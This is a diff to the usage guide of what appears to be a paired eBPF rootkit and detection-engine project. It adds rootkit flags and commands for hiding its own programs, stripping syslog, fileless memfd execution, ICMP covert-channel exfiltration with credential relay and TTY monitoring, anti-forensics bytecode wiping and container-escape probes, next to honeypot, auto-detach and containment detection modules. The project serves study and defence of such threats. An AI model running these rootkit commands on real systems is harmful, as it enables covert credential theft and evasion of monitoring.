@@ -63,8 +63,20 @@ cargo build
 ### Basic Usage
 
 ```bash
-# Start the rootkit with default settings (loads all 13 features)
+# Start the rootkit with default settings (loads core 13 features)
 sudo ./target/release/offense --iface eth0
+
+# Enable all extended features
+sudo ./target/release/offense --iface eth0 \
+    --enable-netns-hide \
+    --enable-bpf-cloak \
+    --enable-module-mask \
+    --enable-memfd \
+    --enable-syslog-strip \
+    --enable-icmp-exfil \
+    --enable-socket-clone \
+    --enable-cred-relay \
+    --enable-container-probe
 ```
 
 ### CLI Flags
@@ -79,6 +91,16 @@ sudo ./target/release/offense --iface eth0
 | `--spoof-ppid <pid:fake_ppid>` | Spoof a process's parent PID |
 | `--timestomp <inode:atime:mtime:ctime>` | Set fake timestamps (epoch seconds) |
 | `--pin-maps` | Pin BPF maps to `/sys/fs/bpf/shadow` for persistence |
+| `--enable-netns-hide` | Enable network namespace hiding (intercepts setns) |
+| `--enable-bpf-cloak` | Enable eBPF program cloaking (hides own prog IDs) |
+| `--enable-module-mask` | Enable kernel module masquerading in /proc/modules |
+| `--enable-memfd` | Enable memory-only payload staging (memfd_create + execveat) |
+| `--enable-syslog-strip` | Enable syslog write stripping for hidden PIDs |
+| `--wipe-bytecode` | Activate anti-forensics bytecode wipe (programs become no-ops) |
+| `--enable-icmp-exfil` | Enable ICMP covert channel exfiltration |
+| `--enable-socket-clone` | Enable socket cloning / connection shadowing |
+| `--enable-cred-relay` | Enable credential relay over C2 channel |
+| `--enable-container-probe` | Enable container escape probes |
 
 ### Feature-Specific Examples
 
@@ -126,6 +148,50 @@ sudo ./target/release/offense --iface eth0 \
 sudo ./target/release/offense --iface eth0 --pin-maps
 
 # Maps will be available at /sys/fs/bpf/shadow
+```
+
+#### 7. ICMP Covert Channel
+```bash
+# Enable ICMP-based data exfiltration
+sudo ./target/release/offense --iface eth0 --enable-icmp-exfil
+
+# Data is embedded in ICMP echo-request payloads (56 bytes per packet)
+# Combined with credential relay for automated exfil:
+sudo ./target/release/offense --iface eth0 \
+    --enable-icmp-exfil \
+    --enable-cred-relay \
+    --monitor-tty 136:0
+```
+
+#### 8. Network Namespace Hiding
+```bash
+# Hide network namespaces from tools like ip netns
+sudo ./target/release/offense --iface eth0 --enable-netns-hide
+```
+
+#### 9. eBPF Program Cloaking
+```bash
+# Hide rootkit's own BPF program IDs from bpftool
+sudo ./target/release/offense --iface eth0 --enable-bpf-cloak
+```
+
+#### 10. Anti-Forensics Bytecode Wipe
+```bash
+# After initial operation, wipe program logic for anti-forensics
+# Programs remain attached but become no-ops (evades bytecode dump analysis)
+sudo ./target/release/offense --iface eth0 --wipe-bytecode
+```
+
+#### 11. Container Escape Probes
+```bash
+# Detect container context and monitor privilege escalation attempts
+sudo ./target/release/offense --iface eth0 --enable-container-probe
+```
+
+#### 12. Memory-Only Execution
+```bash
+# Enable fileless execution path (memfd_create + execveat AT_EMPTY_PATH)
+sudo ./target/release/offense --iface eth0 --enable-memfd
 ```
 
 ### Network C2 Commands
@@ -200,29 +266,86 @@ sudo ./target/release/defense --all-modules --output /tmp/alerts.json
 | `--verbose` / `-v` | Enable debug-level logging |
 | `--output` / `-o` | Path to write JSON alert records |
 | `--threshold` / `-t` | Alert severity threshold: 1=Low, 2=Medium (default), 3=High, 4=Critical |
-| `--all-modules` | Enable all 5 detection modules |
+| `--all-modules` | Enable all detection modules |
 | `--ghost-maps` | Enable ghost map detection |
 | `--syscall-latency` | Enable syscall latency monitoring |
 | `--bytecode-check` | Enable bytecode integrity checking |
 | `--hidden-process` | Enable hidden process detection |
 | `--suspicious-hooks` | Enable suspicious hook detection |
+| `--prog-inventory` | Enable eBPF program inventory (ID gap detection) |
+| `--syscall-anomaly` | Enable syscall argument anomaly profiling |
+| `--net-baseline` | Enable network behavior baseline |
+| `--memfd-detect` | Enable memory-backed execution detection |
+| `--map-audit` | Enable BPF map content auditing |
+| `--tracepoint-monitor` | Enable tracepoint coverage monitoring (rapid detach detection) |
+| `--auto-detach` | Automatic detachment of malicious BPF programs |
+| `--auto-contain` | Automatic process containment via cgroups |
+| `--honeypots` | Enable honeypot BPF maps |
 | `--calibration-period` | Baseline calibration duration in seconds (default: 60) |
 | `--config` | Path to runtime config JSON file (hot-reloaded every 5s) |
 
 ### Module-Specific Detection
 
 ```bash
-# Enable only specific modules
+# Original 5 core modules
 sudo ./target/release/defense \
     --ghost-maps \
     --syscall-latency \
-    --bytecode-check
+    --bytecode-check \
+    --hidden-process \
+    --suspicious-hooks
+
+# Extended detection modules
+sudo ./target/release/defense \
+    --prog-inventory \
+    --syscall-anomaly \
+    --net-baseline \
+    --memfd-detect \
+    --map-audit \
+    --tracepoint-monitor
+
+# Active response modules
+sudo ./target/release/defense \
+    --all-modules \
+    --auto-detach \
+    --auto-contain \
+    --honeypots
 
 # Set alert threshold (1=Low, 2=Medium, 3=High, 4=Critical)
 sudo ./target/release/defense --all-modules --threshold 3
 
 # Custom calibration period
 sudo ./target/release/defense --all-modules --calibration-period 120
+```
+
+### Honeypot Maps
+
+The honeypot module creates decoy BPF maps with enticing names and pins them to `/sys/fs/bpf/honeypot/`. Any process that accesses these maps triggers a CRITICAL alert.
+
+```bash
+# Enable honeypot maps
+sudo ./target/release/defense --honeypots --verbose
+
+# Decoy maps created:
+#   /sys/fs/bpf/honeypot/shadow_config
+#   /sys/fs/bpf/honeypot/rootkit_pids
+#   /sys/fs/bpf/honeypot/c2_keys
+```
+
+### Auto-Detach
+
+When enabled, the defense engine automatically detaches BPF programs that accumulate 3+ corroborating alerts (from prog_inventory, suspicious_hooks, or map_audit modules).
+
+```bash
+sudo ./target/release/defense --all-modules --auto-detach
+```
+
+### Auto-Contain
+
+When an attack chain is detected (3+ distinct alert types for a single PID within the sliding window), the engine moves the offending process into a restrictive cgroup.
+
+```bash
+sudo ./target/release/defense --all-modules --auto-contain
 ```
 
 ### Runtime Configuration (Hot-Reload)
@@ -259,6 +382,7 @@ The engine provides more than raw alert forwarding:
 - **Calibration**: During the initial calibration period, the engine collects baseline alert rates per type. After calibration completes, anomaly scoring activates.
 - **Anomaly Scoring**: Each alert's rate (per PID, within the sliding window) is compared to the calibrated baseline. A score >= 10.0 escalates severity to CRITICAL.
 - **Attack Chain Detection**: When a single PID triggers 3 or more distinct alert types within the sliding window, the engine flags the alerts as a correlated attack chain.
+- **Correlation Graph**: A DAG structure tracks alert relationships (same-PID, parent-child, temporal proximity). Connected components with 3+ nodes are identified as coordinated attacks.
 - **Metrics**: On shutdown (Ctrl+C), the engine prints a summary: alerts processed, alerts suppressed (below threshold), attack chains detected, anomaly escalations, and a per-type breakdown.
 
 ### Analyzing Alerts
@@ -281,6 +405,9 @@ jq -r '[.timestamp, .alert_type, .pid] | @tsv' /tmp/alerts.json
 
 # Show anomaly scores above threshold
 jq 'select(.anomaly_score > 5.0)' /tmp/alerts.json
+
+# Filter honeypot alerts
+jq 'select(.alert_type == "HONEYPOT_READ")' /tmp/alerts.json
 ```
 
 ## Testing
@@ -328,13 +455,36 @@ cat /tmp/test.txt  # Should show zeros
 
 #### Test Defense Detection
 ```bash
-# Terminal 1: Start defense
-sudo ./target/release/defense --all-modules --verbose
+# Terminal 1: Start defense with all modules
+sudo ./target/release/defense --all-modules --verbose --honeypots
 
 # Terminal 2: Start offense (should trigger alerts)
-sudo ./target/release/offense --iface eth0 --hide-pid 1234
+sudo ./target/release/offense --iface eth0 \
+    --hide-pid 1234 \
+    --enable-bpf-cloak \
+    --enable-memfd
 
-# Check Terminal 1 for alerts
+# Check Terminal 1 for alerts (ghost_map, prog_inventory, memfd_exec)
+```
+
+#### Test Honeypot Detection
+```bash
+# Terminal 1: Start defense with honeypots
+sudo ./target/release/defense --honeypots --verbose
+
+# Terminal 2: Attempt to read honeypot map
+sudo bpftool map dump pinned /sys/fs/bpf/honeypot/shadow_config
+
+# Terminal 1 should show CRITICAL HONEYPOT_READ alert
+```
+
+#### Test Auto-Contain
+```bash
+# Start defense with auto-containment
+sudo ./target/release/defense --all-modules --auto-contain --verbose
+
+# In another terminal, trigger attack chain (3+ alert types from one PID)
+# The defense engine will move the PID to a restrictive cgroup
 ```
 
 ## Troubleshooting
@@ -376,6 +526,12 @@ mount | grep bpf
 sudo mount -t bpf bpf /sys/fs/bpf
 ```
 
+#### 5. Honeypot Pin Directory
+```bash
+# Create honeypot pin directory if needed
+sudo mkdir -p /sys/fs/bpf/honeypot
+```
+
 ### Debug Mode
 
 ```bash
@@ -402,6 +558,9 @@ sudo dmesg | grep -i bpf
 
 # Use higher threshold to reduce alert volume
 ./target/release/defense --all-modules --threshold 3
+
+# Shorter calibration for faster startup
+./target/release/defense --all-modules --calibration-period 30
 ```
 
 ### Optimize for Production
@@ -432,6 +591,7 @@ sudo pkill -9 defense
 
 # Remove pinned maps
 sudo rm -rf /sys/fs/bpf/shadow
+sudo rm -rf /sys/fs/bpf/honeypot
 
 # Detach XDP/TC programs
 sudo ip link set dev eth0 xdp off
